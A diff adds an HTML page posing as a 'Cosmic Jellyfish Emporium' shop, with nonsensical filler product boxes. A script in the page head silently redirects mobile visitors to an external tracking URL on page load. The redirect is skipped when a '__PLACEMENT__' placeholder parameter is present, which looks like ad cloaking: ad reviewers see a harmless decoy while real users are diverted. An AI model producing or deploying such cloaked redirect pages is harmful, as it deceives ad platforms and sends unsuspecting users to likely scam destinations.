@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Jellyfish Emporium</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            color: #fff;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+        }
+        header {
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px 4px #000;
+        }
+        .box {
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 20px;
+            transition: transform 0.3s;
+        }
+        .box:hover {
+            transform: scale(1.05);
+        }
+        footer {
+            background-color: rgba(0, 0, 0, 0.5);
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        a {
+            color: #fff;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Cosmic Jellyfish Emporium</h1>
+    </header>
+    <div class="container">
+        <div class="box">
+            <h2>Luminescent Tentacles</h2>
+            <p>Explore our collection of glowing jellyfish appendages.</p>
+        </div>
+        <div class="box">
+            <h2>Bioluminescent Bells</h2>
+            <p>Discover the beauty of our light-emitting jellyfish bodies.</p>
+        </div>
+        <div class="box">
+            <h2>Ethereal Propulsion</h2>
+            <p>Learn about the graceful movement of our cosmic jellyfish.</p>
+        </div>
+        <div class="box">
+            <h2>Galactic Jelly Aquariums</h2>
+            <p>Create your own universe with our specially designed habitats.</p>
+        </div>
+        <div class="box">
+            <h2>Interstellar Jellyfish Food</h2>
+            <p>Nourish your cosmic companions with our premium jellyfish cuisine.</p>
+        </div>
+        <div class="box">
+            <h2>Nebula Jellyfish Accessories</h2>
+            <p>Enhance your jellyfish experience with our space-age accessories.</p>
+        </div>
+    </div>
+    <footer>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
